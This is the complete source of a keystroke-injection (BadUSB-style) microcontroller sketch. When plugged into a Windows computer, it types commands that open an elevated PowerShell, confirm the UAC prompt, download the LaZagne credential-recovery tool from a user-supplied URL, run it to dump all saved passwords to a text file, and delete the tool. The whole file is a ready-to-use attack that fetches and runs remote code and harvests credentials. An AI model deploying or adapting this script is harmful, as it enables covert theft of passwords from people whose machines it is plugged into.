#include <esKeyboard.h>

#define defaultDelay 5

bool admin = true;

String filename = "lazagne.exe";
String fileurl = ""; // LAZAGNE DIRECT LINK DOWNLOAD

void typeKey(int key){
  Keyboard.press(key);
  delay(defaultDelay);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();

  delay(1000);

  delay(defaultDelay);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  if(admin)
  {

    Keyboard.print("powershell Start-Process powershell -Verb RunAs");
    typeKey(KEY_RETURN);

    delay(1000);

    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press('s');
    Keyboard.releaseAll();

  } else {

     Keyboard.print("powershell");
    typeKey(KEY_RETURN);

  }

  delay(1000);

  Keyboard.print("Invoke-WebRequest -Uri \"");
  Keyboard.print(fileurl);
  Keyboard.print("\" -OutFile \"$env:TEMP\\");
  Keyboard.print(filename);
  Keyboard.print("\"");

  delay(defaultDelay);
  typeKey(KEY_RETURN);

  delay(1500);

  Keyboard.print("cd $env:TEMP; ./");
  Keyboard.print(filename);
  Keyboard.print(" all -v > lazagnepass.txt; rm ");
  Keyboard.print(filename);
  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("exit");
  typeKey(KEY_RETURN);

  /* ----- End-Script -----*/

  Keyboard.end();
}

void loop(){ /* ----- Unused-Loop -----*/ }
